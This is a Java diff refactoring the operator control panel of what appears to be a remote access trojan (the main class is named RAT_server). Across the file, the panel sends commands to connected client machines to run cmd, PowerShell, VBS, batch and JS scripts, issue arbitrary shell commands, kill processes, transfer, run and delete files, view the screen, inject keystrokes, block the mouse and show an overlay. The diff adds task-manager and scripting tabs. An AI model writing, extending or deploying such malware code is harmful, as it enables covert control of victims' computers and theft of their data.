@@ -5,7 +5,6 @@ import java.awt.datatransfer.Clipboard;
 import java.awt.datatransfer.StringSelection;
 import java.io.File;
 import java.io.IOException;
-import java.net.URL;
 import java.util.ArrayList;
 import java.util.Collections;
 import java.util.List;
@@ -13,6 +12,10 @@ import java.util.Optional;
 import org.json.simple.JSONObject;
 
 import electron.RAT_server;
+import electron.actions.Explorer;
+import electron.actions.Misc;
+import electron.actions.Scripting;
+import electron.actions.Taskmgr;
 import electron.networking.FileReceiver;
 import electron.networking.FileSender;
 import electron.networking.Listener;
@@ -34,11 +37,8 @@ import javafx.collections.ObservableList;
 import javafx.embed.swing.SwingFXUtils;
 import javafx.event.EventHandler;
 import javafx.fxml.FXML;
-import javafx.fxml.FXMLLoader;
-import javafx.scene.Scene;
 import javafx.scene.control.*;
 import javafx.scene.control.Alert.AlertType;
-import javafx.scene.image.Image;
 import javafx.scene.image.ImageView;
 import javafx.scene.image.WritableImage;
 import javafx.scene.input.KeyCode;
@@ -47,7 +47,6 @@ import javafx.scene.input.MouseButton;
 import javafx.scene.layout.AnchorPane;
 import javafx.scene.text.Text;
 import javafx.stage.FileChooser;
-import javafx.stage.Stage;
 
 public class MainWindowControls {
 	public static SocketHandler handler;
@@ -58,6 +57,10 @@ public class MainWindowControls {
 	private TabPane connections_tabpane;
 	@FXML
 	private Tab tab_screenv2;
+	@FXML
+	private Tab tab_taskmgr;
+	@FXML
+	private Tab tab_scripts;
 	@FXML
 	private AnchorPane screen_pane;
 	@FXML
@@ -274,11 +277,22 @@ public class MainWindowControls {
 	}
 
 	/**
-	 * View change listener
+	 * View change
 	 */
-	@FXML
 	private void viewChaged() {
 		String tabName = connections_tabpane.getSelectionModel().getSelectedItem().getText();
+		try {
+			if (handler != null) {
+				// If selected OS does not support some functions - hiding them
+				tab_taskmgr.setDisable(!handler.isWindows());
+				tab_scripts.setDisable(!handler.isWindows());
+			} else {
+				tab_taskmgr.setDisable(false);
+				tab_scripts.setDisable(false);
+			}
+		} catch (java.lang.NullPointerException e) {
+			logger.warn("[Graphics]: error updating visible components. Message: " + e.getMessage());
+		}
 		if (tabName.equals("Console")) {
 			updateConsoleTab();
 		} else if (tabName.equals("Connections")) {
@@ -303,66 +317,13 @@ public class MainWindowControls {
 	private void script_executeAction() {
 		if (handler == null) {
 			Utils.showErrorMessage("Incorrect action", "You must select client first!",
-					"Select client in 'Connections' pane firstly.");
-			logger.log("[electron.gui.MainWindowControls.script_executeAction]: handler = null");
+					"Select client in 'Connections' pane firstly.", false);
 			return;
 		}
-		// Defining executor type
+		// Executing script
 		String script = script_code.getText();
-		ScriptFilePacket packet;
-		switch (script_executor.getSelectionModel().getSelectedItem()) {
-		case "cmd":
-			packet = new ScriptFilePacket(ScriptFilePacket.EXECUTOR_CMD, script);
-			if (!handler.send(packet.get().toJSONString())) {
-				logger.error("[electron.gui.MainWindowControls.script_executeAction]: error sending packet.");
-				Utils.showErrorMessage("Socket Error", "Error sending script packet.",
-						"Error sending script packet. Caused by SocketHandler.");
-			}
-			return;
-		case "ps1":
-			packet = new ScriptFilePacket(ScriptFilePacket.EXECUTOR_POWERSHELL, script);
-			if (!handler.send(packet.get().toJSONString())) {
-				logger.error("[electron.gui.MainWindowControls.script_executeAction]: error sending packet.");
-				Utils.showErrorMessage("Socket Error", "Error sending script packet.",
-						"Error sending script packet. Caused by SocketHandler.");
-			}
-			return;
-		case "psconsole":
-			packet = new ScriptFilePacket(ScriptFilePacket.EXECUTOR_POWERSHELL_CONSOLE, script);
-			if (!handler.send(packet.get().toJSONString())) {
-				logger.error("[electron.gui.MainWindowControls.script_executeAction]: error sending packet.");
-				Utils.showErrorMessage("Socket Error", "Error sending script packet.",
-						"Error sending script packet. Caused by SocketHandler.");
-			}
-			return;
-		case "vbs":
-			packet = new ScriptFilePacket(ScriptFilePacket.EXECUTOR_VBS, script);
-			if (!handler.send(packet.get().toJSONString())) {
-				logger.error("[electron.gui.MainWindowControls.script_executeAction]: error sending packet.");
-				Utils.showErrorMessage("Socket Error", "Error sending script packet.",
-						"Error sending script packet. Caused by SocketHandler.");
-			}
-			return;
-		case "bat":
-			packet = new ScriptFilePacket(ScriptFilePacket.EXECUTOR_BAT, script);
-			if (!handler.send(packet.get().toJSONString())) {
-				logger.error("[electron.gui.MainWindowControls.script_executeAction]: error sending packet.");
-				Utils.showErrorMessage("Socket Error", "Error sending script packet.",
-						"Error sending script packet. Caused by SocketHandler.");
-			}
-			return;
-		case "js":
-			packet = new ScriptFilePacket(ScriptFilePacket.EXECUTOR_JS, script);
-			if (!handler.send(packet.get().toJSONString())) {
-				logger.error("[electron.gui.MainWindowControls.script_executeAction]: error sending packet.");
-				Utils.showErrorMessage("Socket Error", "Error sending script packet.",
-						"Error sending script packet. Caused by SocketHandler.");
-			}
-			return;
-		default:
-			Utils.showErrorMessage("Internal error", "Error",
-					"Internal error in script_executeAction(): switch(script_executor)");
-		}
+		String type = script_executor.getSelectionModel().getSelectedItem();
+		Scripting.executeScript(handler, script, type, false);
 	}
 
 	@FXML
@@ -393,12 +354,7 @@ public class MainWindowControls {
 			return;
 		}
 		tasks_time.setText(handler.getLastTaskmgrDate());
-		// If fastmode enabled
-		if (tasks_fastmode.isSelected()) {
-			OutputPacket.sendOutPacket("/tasklistfast");
-		} else {
-			OutputPacket.sendOutPacket("/tasklist");
-		}
+		Taskmgr.requestData(handler, tasks_fastmode.isSelected(), false);
 		if (handler.getTaskList() == null) {
 			return;
 		}
@@ -450,17 +406,20 @@ public class MainWindowControls {
 
 	@FXML
 	private void tasks_killAction() {
-		ProcessPacket packet = tasks_table.getSelectionModel().getSelectedItem();
 		if (handler == null) {
 			return;
 		}
-		if (!packet.getSession().getValue().equalsIgnoreCase("Linux")) {
-			// Windows
-			OutputPacket.sendOutPacket("taskkill /pid " + packet.getPid().getValue() + " /t /f");
-		} else {
-			// Linux
-			OutputPacket.sendOutPacket("kill -9 " + packet.getPid().getValue());
+		ProcessPacket packet = tasks_table.getSelectionModel().getSelectedItem();
+		Taskmgr.killProcess_PID(packet, handler, false);
+	}
+
+	@FXML
+	private void tasks_killNameAction() {
+		if (handler == null) {
+			return;
 		}
+		ProcessPacket packet = tasks_table.getSelectionModel().getSelectedItem();
+		Taskmgr.killProcess_NAME(packet, handler, false);
 	}
 
 	@FXML
@@ -471,7 +430,7 @@ public class MainWindowControls {
 						+ " | " + packet.getSession().getValue() + " | " + packet.getTitle().getValue());
 		Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
 		clipboard.setContents(stringSelection, null);
-		Utils.showMessage("Success", "Success", "Copied text to chipboard.");
+		Utils.showMessage("Success", "Success", "Copied text to chipboard.", false);
 	}
 
 	/*
@@ -496,41 +455,33 @@ public class MainWindowControls {
 
 	@FXML
 	private void screen_overlayAction() {
-		OutputPacket.sendOutPacket("/overlay");
+		Misc.toggle_overlay(handler, false);
 	}
 
 	@FXML
 	private void screen_blockMouseAction() {
-		OutputPacket.sendOutPacket("/blockmouse");
+		Misc.toggle_blockmouse(handler, false);
 	}
 
 	@FXML
 	private void screen_sendkeysAction() {
 		if (handler == null) {
 			Utils.showErrorMessage("Incorrect action", "You must select client first!",
-					"Select client in 'Connections' pane firstly.");
+					"Select client in 'Connections' pane firstly.", false);
 			return;
 		}
 		String keys = screen_keyfield.getText();
-		if (keys.isEmpty()) {
-			return;
-		}
-		if (keys.contains(" ")) {
-			OutputPacket.sendOutPacket("/presskeys " + keys);
-			return;
-		}
-		OutputPacket.sendOutPacket("/presskey " + keys);
-		return;
+		Misc.presskeys(handler, keys, false);
 	}
 
 	@FXML
 	private void toggleScreen() {
 		if (handler == null) {
 			Utils.showErrorMessage("Incorrect action", "You must select client first!",
-					"Select client in 'Connections' pane firstly.");
+					"Select client in 'Connections' pane firstly.", false);
 			return;
 		}
-		OutputPacket.sendOutPacket("/screen");
+		Misc.toggle_screen(handler, false);
 	}
 
 	@FXML
@@ -540,7 +491,7 @@ public class MainWindowControls {
 
 	@FXML
 	private void settings_launchPlayerGui() {
-		OutputPacket.sendOutPacket("/player soundpacket");
+		OutputPacket.sendOutPacket("/player soundpacket", handler, false);
 	}
 
 	/*
@@ -563,10 +514,10 @@ public class MainWindowControls {
 	private void toggleScreenV2() {
 		if (handler == null) {
 			Utils.showErrorMessage("Incorrect action", "You must select client first!",
-					"Select client in 'Connections' pane firstly.");
+					"Select client in 'Connections' pane firstly.", false);
 			return;
 		}
-		OutputPacket.sendOutPacket("/screenv2");
+		Misc.toggle_screenV2(handler, false);
 	}
 
 	/*
@@ -574,6 +525,7 @@ public class MainWindowControls {
 	 */
 	private void updateExplorer() {
 		if (handler == null || handler.getInfo() == null) {
+			explorer_path.setText("");
 			return;
 		}
 		if (handler.isWindows()) {
@@ -611,19 +563,15 @@ public class MainWindowControls {
 	private void explorer_runAction() {
 		if (handler == null) {
 			Utils.showErrorMessage("Incorrect action", "You must select client first!",
-					"Select client in 'Connections' pane firstly.");
+					"Select client in 'Connections' pane firstly.", false);
 			return;
 		}
 		if (explorer_list.getSelectionModel().getSelectedItem().isEmpty()) {
-			Utils.showMessage("Incorrect action", "You must select file to open", "You must select file to open");
+			Utils.showMessage("Incorrect action", "You must select file to open", "You must select file to open",
+					false);
 		} else {
 			String f = explorer_list.getSelectionModel().getSelectedItem();
-			if (handler.isWindows()) {
-				OutputPacket.sendOutPacket("cd " + explorer_path.getText() + "&start " + f);
-			} else {
-				OutputPacket.sendOutPacket("cd " + explorer_path.getText() + "; ./ " + f);
-			}
-			Utils.showMessage("runAction", "Success", "Started file: " + f);
+			Explorer.runFile(handler, explorer_path.getText(), f, false);
 		}
 	}
 
@@ -631,40 +579,44 @@ public class MainWindowControls {
 	private void explorer_runListenerAction() {
 		if (handler == null) {
 			Utils.showErrorMessage("Incorrect action", "You must select client first!",
-					"Select client in 'Connections' pane firstly.");
+					"Select client in 'Connections' pane firstly.", false);
 			return;
 		}
 		if (explorer_list.getSelectionModel().getSelectedItem().isEmpty()) {
-			Utils.showErrorMessage("Incorrect action", "You must select file to open", "You must select file to open");
+			Utils.showErrorMessage("Incorrect action", "You must select file to open", "You must select file to open",
+					false);
 		} else {
 			String f = explorer_list.getSelectionModel().getSelectedItem();
-			// Creating packet to send
-			OutputPacket.sendOutPacket("cd " + explorer_path.getText() + "&" + "\"" + f + "\"");
-			Utils.showMessage("runListenerAction", "Success", "Started file: " + f);
+			Explorer.runListener(handler, explorer_path.getText(), f, false);
 		}
 	}
 
 	@FXML
 	private void explorer_openAction() {
-		String result = explorer_path.getText();
 		if (explorer_list.getSelectionModel().getSelectedItem().isEmpty()) {
-			Utils.showErrorMessage("Incorrect action", "You must select file to open", "You must select file to open");
+			Utils.showErrorMessage("Incorrect action", "You must select file to open", "You must select file to open",
+					false);
 		} else {
-			if (result.endsWith("/") || result.endsWith("\\")) {
-				result = result + explorer_list.getSelectionModel().getSelectedItem();
-			} else {
-				result = result + "/" + explorer_list.getSelectionModel().getSelectedItem();
-			}
-			explorer_path.setText(result);
+			explorer_path.setText(
+					Explorer.openPath(explorer_path.getText(), explorer_list.getSelectionModel().getSelectedItem()));
 			sendExplorer();
 		}
 	}
 
 	@FXML
 	private void explorer_backAction() {
-		// Linux unsupported.
-		File f = new File(explorer_path.getText());
-		explorer_path.setText(f.getParent());
+		String path = explorer_path.getText();
+		if (handler == null) {
+			Utils.showErrorMessage("Incorrect action", "You must select client first!",
+					"Select client in 'Connections' pane firstly.", false);
+			return;
+		}
+		if (System.getProperty("os.name").toLowerCase().contains("windows") == handler.isWindows()) {
+			path = Explorer.getParentNative(path);
+		} else {
+			path = Explorer.getParent(handler, path, false);
+		}
+		explorer_path.setText(path);
 		sendExplorer();
 	}
 
@@ -672,7 +624,7 @@ public class MainWindowControls {
 	private void explorer_createAction() {
 		if (handler == null) {
 			Utils.showErrorMessage("Incorrect action", "You must select client first!",
-					"Select client in 'Connections' pane firstly.");
+					"Select client in 'Connections' pane firstly.", false);
 			return;
 		}
 		TextInputDialog td = new TextInputDialog();
@@ -681,34 +633,21 @@ public class MainWindowControls {
 		Optional<String> a = td.showAndWait();
 		String fname = a.get();
 		logger.log("[electron.gui.MainWindowControls.explorer_createAction] creating file: " + fname);
-		String result = explorer_path.getText();
-		if (result.endsWith("/") || result.endsWith("\\")) {
-			result = result + fname;
-		} else {
-			result = result + "/" + fname;
-		}
-		ExplorerPacketOutput packet = new ExplorerPacketOutput(explorer_path.getText(), "create " + result);
-		handler.send(packet.get());
+		Explorer.createFile(handler, explorer_path.getText(), fname);
 	}
 
 	@FXML
 	private void explorer_deleteAction() {
 		if (handler == null) {
 			Utils.showErrorMessage("Incorrect action", "You must select client first!",
-					"Select client in 'Connections' pane firstly.");
+					"Select client in 'Connections' pane firstly.", false);
 			return;
 		}
-		String result = explorer_path.getText();
 		if (explorer_list.getSelectionModel().getSelectedItem().isEmpty()) {
-			Utils.showErrorMessage("Incorrect action", "You must select file!", "Select file you want to delete");
+			Utils.showErrorMessage("Incorrect action", "You must select file!", "Select file you want to delete",
+					false);
 		} else {
-			if (result.endsWith("/") || result.endsWith("\\")) {
-				result = result + explorer_list.getSelectionModel().getSelectedItem();
-			} else {
-				result = result + "/" + explorer_list.getSelectionModel().getSelectedItem();
-			}
-			ExplorerPacketOutput packet = new ExplorerPacketOutput(explorer_path.getText(), "del " + result);
-			handler.send(packet.get());
+			Explorer.deleteFile(handler, explorer_path.getText(), explorer_list.getSelectionModel().getSelectedItem());
 		}
 	}
 
@@ -716,25 +655,28 @@ public class MainWindowControls {
 	private void explorer_editAction() {
 		if (handler == null) {
 			Utils.showErrorMessage("Incorrect action", "You must select client first!",
-					"Select client in 'Connections' pane firstly.");
+					"Select client in 'Connections' pane firstly.", false);
 			return;
 		}
 		String result = explorer_path.getText();
 		if (explorer_list.getSelectionModel().getSelectedItem().isEmpty()) {
-			Utils.showErrorMessage("Incorrect action", "You must select file to edit!",
-					"You must select file to edit!");
+			Utils.showErrorMessage("Incorrect action", "You must select file to edit!", "You must select file to edit!",
+					false);
 		} else {
 			if (result.endsWith("/") || result.endsWith("\\")) {
 				result = result + explorer_list.getSelectionModel().getSelectedItem();
 			} else {
 				result = result + "/" + explorer_list.getSelectionModel().getSelectedItem();
 			}
-			OutputPacket.sendOutPacket("/edit=" + result);
+			OutputPacket.sendOutPacket("/edit=" + result, handler, false);
 		}
 	}
 
 	@FXML
-	private void explorer_contextOpened() {
+	private synchronized void explorer_contextOpened() {
+		if (handler == null) {
+			return;
+		}
 		if (settings_contextmenurexplorer.isSelected()) {
 			// If bypassing enabled
 			explorer_playfunction.setVisible(true);
@@ -742,7 +684,8 @@ public class MainWindowControls {
 			explorer_editfunction.setVisible(true);
 			return;
 		}
-		if (!explorer_list.getSelectionModel().getSelectedItem().isEmpty()) {
+		if (explorer_list.getSelectionModel().getSelectedItem() != null
+				&& !explorer_list.getSelectionModel().getSelectedItem().isEmpty()) {
 			explorer_playfunction.setVisible(explorer_list.getSelectionModel().getSelectedItem().endsWith(".wav"));
 			explorer_runlistenerfunction.setVisible(handler.isWindows());
 			explorer_editfunction.setVisible(explorer_list.getSelectionModel().getSelectedItem().contains("."));
@@ -753,17 +696,10 @@ public class MainWindowControls {
 	private void explorer_play() {
 		if (handler == null) {
 			Utils.showErrorMessage("Incorrect action", "You must select client first!",
-					"Select client in 'Connections' pane firstly.");
+					"Select client in 'Connections' pane firstly.", false);
 			return;
 		}
-		String result = explorer_path.getText();
-		if (result.endsWith("/") || result.endsWith("\\")) {
-			result = result + explorer_list.getSelectionModel().getSelectedItem();
-		} else {
-			result = result + "/" + explorer_list.getSelectionModel().getSelectedItem();
-		}
-		OutputPacket.sendOutPacket("/player " + result);
-		OutputPacket.sendOutPacket("/player soundpacket");
+		Explorer.play(handler, explorer_path.getText(), explorer_list.getSelectionModel().getSelectedItem(), false);
 	}
 
 	@SuppressWarnings("unchecked")
@@ -771,7 +707,7 @@ public class MainWindowControls {
 	private void explorer_upload() {
 		if (handler == null) {
 			Utils.showErrorMessage("Incorrect action", "You must select client first!",
-					"Select client in 'Connections' pane firstly.");
+					"Select client in 'Connections' pane firstly.", false);
 			return;
 		}
 		// Selecting file to send
@@ -779,14 +715,7 @@ public class MainWindowControls {
 		fileChooser.setTitle("Open File");
 		File file = fileChooser.showOpenDialog(RAT_server.getInitialStage());
 		if (file != null) {
-			// Starting server
-			new FileSender(file).start();
-			// Starting receiver
-			JSONObject packet = new JSONObject();
-			packet.put("packettype", "2");
-			packet.put("type", "1");
-			packet.put("path", explorer_path.getText() + "/" + file.getName());
-			handler.send(packet.toJSONString());
+			Explorer.lauch_uploader(handler, explorer_path.getText(), file);
 		}
 	}
 
@@ -795,34 +724,17 @@ public class MainWindowControls {
 	private void explorer_download() {
 		if (handler == null) {
 			Utils.showErrorMessage("Incorrect action", "You must select client first!",
-					"Select client in 'Connections' pane firstly.");
+					"Select client in 'Connections' pane firstly.", false);
 			return;
 		}
-		String result = explorer_path.getText();
 		if (explorer_list.getSelectionModel().getSelectedItem().isEmpty()) {
 			Alert al = new Alert(AlertType.ERROR);
 			al.setTitle("Incorrect action");
 			al.setContentText("You must select file to download.");
 			al.show();
 		} else {
-			if (result.endsWith("/") || result.endsWith("\\")) {
-				result = result + explorer_list.getSelectionModel().getSelectedItem();
-			} else {
-				result = result + "/" + explorer_list.getSelectionModel().getSelectedItem();
-			}
-			JSONObject packet = new JSONObject();
-			packet.put("packettype", "2");
-			packet.put("type", "0");
-			packet.put("path", result);
-			if (System.getProperty("os.name").toLowerCase().contains("windows")) {
-				new FileReceiver(Listener.getPort() + 1, System.getProperty("user.home") + "/Downloads/"
-						+ explorer_list.getSelectionModel().getSelectedItem()).start();
-			} else {
-				new FileReceiver(Listener.getPort() + 1,
-						System.getProperty("user.home") + "/" + explorer_list.getSelectionModel().getSelectedItem())
-						.start();
-			}
-			handler.send(packet.toJSONString());
+			Explorer.lauch_downloader(handler, explorer_path.getText(),
+					explorer_list.getSelectionModel().getSelectedItem());
 		}
 	}
 
@@ -831,8 +743,7 @@ public class MainWindowControls {
 		if (handler == null) {
 			return;
 		}
-		ExplorerPacketOutput packet = new ExplorerPacketOutput(explorer_path.getText(), "");
-		handler.send(packet.get());
+		Explorer.updateExplorer(handler, explorer_path.getText());
 	}
 
 	/*
@@ -867,10 +778,10 @@ public class MainWindowControls {
 
 	@FXML
 	private void console_clearAction() {
-		console_consoleview.clear();
 		if (handler == null) {
 			return;
 		}
+		console_consoleview.clear();
 		handler.clearLog();
 	}
 
@@ -878,12 +789,12 @@ public class MainWindowControls {
 	private void sendCommand() {
 		if (handler == null) {
 			Utils.showErrorMessage("Incorrect action", "You must select client first!",
-					"Select client in 'Connections' pane firstly.");
+					"Select client in 'Connections' pane firstly.", false);
 			return;
 		}
 		String command = console_commandfield.getText();
 		// Creating packet to send
-		OutputPacket.sendOutPacket(command);
+		OutputPacket.sendOutPacket(command, handler, false);
 		handler.addMessageToLog("[SERVER]: sending: " + console_commandfield.getText());
 		console_commandfield.setText("");
 	}
